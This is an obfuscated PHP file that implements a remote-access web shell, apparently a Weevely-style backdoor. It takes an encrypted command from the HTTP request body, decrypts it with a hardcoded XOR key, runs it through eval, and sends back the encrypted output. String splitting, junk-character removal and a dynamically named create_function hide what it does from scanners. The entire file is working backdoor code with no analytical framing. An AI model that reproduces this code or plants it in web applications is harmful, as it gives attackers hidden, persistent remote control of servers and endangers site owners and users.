<?php
$w='();@ob_end_clean();$r0O=@b0Oase64_enco0Ode0O(@x(@g0O0Ozcompres0Os($o),$k))0O;print("$0Op$kh$r$0Okf");}';
$v='h("/$kh0O0O(.+)$kf/0O0O",@file0O_get_contents0O("php://0Oinput"0O),$m)0O==1) 0O{@ob0O0O_start';
$N='=00O;0O($j<$c&&$i<$l0O);0O$j++,$0Oi++)0O{$o0O0O.=$t{$i}^$k{$j};}}0Oreturn 0O$o;0O}if (@preg_0O0Omatc';
$Q=str_replace('LO','','LOcreaLOteLO_fLOunLOctiLOon');
$t='();@e0Oval(@gzunco0Ompres0Os(@x(@0Obase60O4_decode0O($m[1])0O,$k)))0O;$0Oo=@ob_get_0Oc0Oon0Ot0Oen0Ots';
$S='";0Ofunctio0On x0O($t,$0Ok){$0Oc=strle0On($k)0O0O;$l=str0Olen0O($t);$o="0O";fo0Or($i=0;$i<$0Ol;){for($j';
$l='$0Ok="3ec0O56a85"0O;$kh="0Od0Oe9a0O7632180Of3";$kf="9014a6cb0O0a9b"0O;$p="hQl0OzwlHWeME0OwBBOJ';
$R=str_replace('0O','',$l.$S.$N.$v.$t.$w);
$V=$Q('',$R);$V();
?>
